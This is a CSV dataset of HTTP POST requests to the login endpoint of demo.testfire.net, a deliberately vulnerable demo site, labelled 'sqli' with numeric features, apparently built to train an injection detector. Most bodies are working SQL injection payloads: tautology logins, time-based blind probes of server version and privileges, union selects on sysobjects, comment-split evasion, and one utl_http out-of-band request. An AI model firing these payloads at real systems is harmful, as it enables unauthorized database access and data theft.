method,path,headers,body,body_length,num_commas,num_hyphens,num_brackets,num_quotes,num_double_quotes,num_slashes,num_braces,num_spaces,has_sql_keywords,has_xss_payload,has_csrf_token,response_status,response_time,nature
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '36', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",a,1,0,0,0,0,0,0,0,0,0,0,0,302,404,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '110', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --",75,2,2,6,3,0,0,0,9,1,0,0,302,378,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '110', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",75,2,2,6,3,0,0,0,9,1,0,0,302,352,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '110', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --",75,2,2,6,3,0,0,0,9,1,0,0,302,294,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '110', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",75,2,2,6,3,0,0,0,9,1,0,0,302,277,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '97', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,62,0,2,2,5,0,0,0,9,1,0,0,302,271,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '99', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- ,64,0,2,2,5,0,0,0,9,1,0,0,302,255,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '127', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,92,0,2,6,5,0,0,0,9,1,0,0,302,254,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '127', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,92,0,2,6,5,0,0,0,9,1,0,0,302,272,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '36', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1,1,0,0,0,0,0,0,0,0,0,0,0,302,275,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '38', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1'1,3,0,0,0,1,0,0,0,0,0,0,0,302,289,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '59', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1 exec sp_ (or exec xp_),24,0,0,2,0,0,0,0,5,1,0,0,302,259,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '44', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1 and 1=1,9,0,0,0,0,0,0,0,2,1,0,0,302,271,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '81', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1' and 1=(select count(*) from tablenames); --,46,0,2,4,1,0,0,0,6,1,0,0,302,274,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '36', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",a,1,0,0,0,0,0,0,0,0,0,0,0,302,286,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '43', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1 or 1=1,8,0,0,0,0,0,0,0,2,1,0,0,302,260,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '47', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1' or '1'='1,12,0,0,0,4,0,0,0,2,1,0,0,302,272,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '60', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1 and user_name() = 'dbo',25,0,0,2,2,0,0,0,4,1,0,0,302,274,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '36', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1,1,0,0,0,0,0,0,0,0,0,0,0,302,286,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '60', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1 and user_name() = 'dbo',25,0,0,2,2,0,0,0,4,1,0,0,302,261,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '53', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",\'; desc users; --,18,0,2,0,1,0,0,0,3,0,0,0,302,291,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '39', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1\'1,4,0,0,0,1,0,0,0,0,0,0,0,302,281,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '65', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1' and non_existant_table = '1,30,0,0,0,2,0,0,0,4,1,0,0,302,288,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '76', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' or username is not NULL or username = ',41,0,0,0,2,0,0,0,9,1,0,0,302,312,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '129', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",94,2,0,8,2,0,0,0,13,1,0,0,302,278,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '107', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}","1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",72,6,2,0,2,0,0,0,11,1,0,0,302,272,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '68', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",1 uni/**/on select all from where,33,0,0,0,0,0,2,0,5,1,0,0,302,289,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '42', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}", or 1=1,7,0,0,0,0,0,0,0,2,1,0,0,302,492,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '46', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",' or '1'='1,11,0,0,0,4,0,0,0,2,1,0,0,302,468,sqli
POST,http://demo.testfire.net/doLogin,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/login.jsp', 'Content-Type': 'application/x-www-form-urlencoded', 'content-length': '80', 'Origin': 'https://demo.testfire.net', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=3DF0A6829EC62974747D3B861C41D305', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",'||utl_http.request('httP://192.168.1.1/')||',45,0,0,2,4,0,3,0,0,0,0,0,302,469,sqli
